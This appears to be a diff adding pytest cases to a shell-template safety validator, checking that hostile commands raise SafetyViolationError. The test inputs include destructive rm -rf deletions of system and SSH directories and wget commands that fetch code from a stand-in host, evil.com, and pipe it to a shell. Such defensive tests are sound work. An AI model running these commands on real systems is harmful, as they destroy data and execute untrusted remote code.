@@ -17,6 +17,22 @@ def test_rm_rf_root_blocked():
     with pytest.raises(SafetyViolationError):
         validate_rendered_output("rm -rf /", "test.sh.j2")
 
+def test_rm_rf_etc_blocked():
+    with pytest.raises(SafetyViolationError):
+        validate_rendered_output("rm -rf /etc/passwd", "test.sh.j2")
+
+def test_rm_rf_home_path_blocked():
+    with pytest.raises(SafetyViolationError):
+        validate_rendered_output("rm -rf /home/user/.ssh", "test.sh.j2")
+
+def test_rm_rf_var_log_blocked():
+    with pytest.raises(SafetyViolationError):
+        validate_rendered_output("rm -rf /var/log", "test.sh.j2")
+
+def test_rm_rf_usr_blocked():
+    with pytest.raises(SafetyViolationError):
+        validate_rendered_output("rm -rf /usr", "test.sh.j2")
+
 def test_rm_rf_home_blocked():
     with pytest.raises(SafetyViolationError):
         validate_rendered_output("rm -rf $HOME", "test.sh.j2")
@@ -40,6 +56,17 @@ def test_windows_format_blocked():
 def test_sql_drop_blocked():
     with pytest.raises(SafetyViolationError):
         validate_rendered_output("DROP DATABASE envforge", "test.sh.j2")
+
+def test_wget_pipe_shell_blocked():
+    with pytest.raises(SafetyViolationError):
+        validate_rendered_output("wget http://evil.com | bash", "test.sh.j2")
+
+def test_wget_download_execute_blocked():
+    with pytest.raises(SafetyViolationError):
+        validate_rendered_output(
+            "wget http://evil.com/fix.sh -O /tmp/fix.sh && sh /tmp/fix.sh",
+            "test.sh.j2",
+        )
 
 def test_pip_install_safe():
     """pip install commands are safe and should pass."""
